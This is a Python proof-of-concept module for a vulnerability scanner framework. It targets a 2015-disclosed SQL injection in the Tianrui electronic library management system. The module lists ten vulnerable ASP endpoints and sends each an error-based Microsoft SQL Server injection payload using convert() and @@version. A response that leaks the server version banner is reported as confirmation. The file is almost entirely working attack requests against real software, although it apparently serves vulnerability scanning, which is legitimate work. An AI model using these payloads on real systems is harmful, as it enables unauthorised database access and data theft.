# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Tianrui_0001' # 平台漏洞编号，留空
    name = '天睿电子图书管理系统系统 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-19'  # 漏洞公布时间
    desc = '''
        天睿电子图书管理系统10处SQL注入漏洞：
        /gl_tj_0.asp?id=1
        /gl_tuijian_1.asp
        /gl_tz_she.asp?zt=1&id=1
        /gl_us_shan.asp?id=1
        /gl_xiu.asp?id=1
        /mafen.asp?shuxing=1
        /ping_cha.asp?mingcheng=1
        /ping_hao.asp?mingcheng=1
        /pl_add.asp?id=1
        /search.asp?keywords=1&shuxing=1
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0120852
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '天睿电子图书管理系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'tianrui_0000' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                arg + '/gl_tj_0.asp?id=1',
                arg + '/gl_tuijian_1.asp',
                arg + '/gl_tz_she.asp?zt=1&id=1',
                arg + '/gl_us_shan.asp?id=1',
                arg + '/gl_xiu.asp?id=1',
                arg + '/mafen.asp?shuxing=1',
                arg + '/ping_cha.asp?mingcheng=1',
                arg + '/ping_hao.asp?mingcheng=1',
                arg + '/pl_add.asp?id=1',
                arg + '/search.asp?keywords=1&shuxing=1',
            ]
            for url in urls:
                url += '%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)'
                code, head, res, err, _ = hh.http(url)
                if((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
            url = arg + 'gl_tz_she.asp?zt=11%20WHERE%201=1%20AND%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--'
            code, head, res, err, _ = hh.http(url)
            if ((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()